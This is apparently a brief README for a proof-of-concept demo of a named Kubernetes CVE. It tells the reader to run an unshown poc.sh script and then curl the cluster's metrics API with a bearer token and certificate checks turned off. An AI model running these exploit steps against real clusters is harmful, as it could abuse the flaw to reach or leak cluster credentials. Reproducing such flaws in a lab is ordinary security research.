# CVE-2022-3172 demo
## Run poc.sh create resources
```
chmod +x poc.sh
./poc.sh
```
## Use Curl
```
curl https://kubernetes.default.svc/apis/metrics.k8s.io/v2beta1/ -k -H "Authorization: Bearer {token}"
```